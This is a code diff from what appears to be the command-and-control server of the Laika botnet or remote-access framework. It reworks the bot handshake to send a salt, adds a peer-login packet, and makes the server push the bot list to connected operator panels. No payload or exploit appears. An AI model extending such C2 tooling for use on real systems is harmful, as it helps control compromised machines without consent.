@@ -84,12 +84,10 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     /* queue response */
     laikaS_startOutPacket(peer, LAIKAPKT_HANDSHAKE_RES);
     laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
+    laikaS_write(&peer->sock, peer->salt, LAIKA_HANDSHAKE_SALT_LEN);
     laikaS_endOutPacket(peer);
 
-    /* handshake (mostly) complete */
-    laikaC_onAddPeer(cnc, peer);
-
-    LAIKA_DEBUG("accepted handshake from peer %p\n", peer);
+    /* handshake (mostly) complete, we now wait for the PEER_LOGIN packets */
 }
 
 void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
@@ -113,9 +111,9 @@ void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
         laikaC_handlePing, \
         0, \
     false), \
-    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, \
-        laikaC_handleAuthenticatedHandshake, \
-        sizeof(uint8_t), \
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PEER_LOGIN_REQ, \
+        laikaC_handlePeerLoginReq, \
+        sizeof(uint8_t) + LAIKA_HANDSHAKE_SALT_LEN, \
     false)
 
 struct sLaika_peerPacketInfo laikaC_botPktTbl[LAIKAPKT_MAXNONE] = {
@@ -217,17 +215,21 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
     int i;
     GETPINFOFROMPEER(peer)->completeHandshake = true;
 
-    /* add peer to panels list (if it's a panel) */
-    if (peer->type == PEER_AUTH)
-        laikaC_addAuth(cnc, peer);
+    /* add to peer lookup map */
+    hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
 
     /* notify connected panels of the newly connected peer */
     for (i = 0; i < cnc->authPeersCount; i++) {
         laikaC_sendNewPeer(cnc->authPeers[i], peer);
     }
 
-    /* add to peer lookup map */
-    hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
+    /* add peer to panels list (if it's a panel) */
+    if (peer->type == PEER_AUTH) {
+        laikaC_addAuth(cnc, peer);
+
+        /* send a list of peers */
+        laikaC_sendPeerList(cnc, peer);
+    }
 }
 
 void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
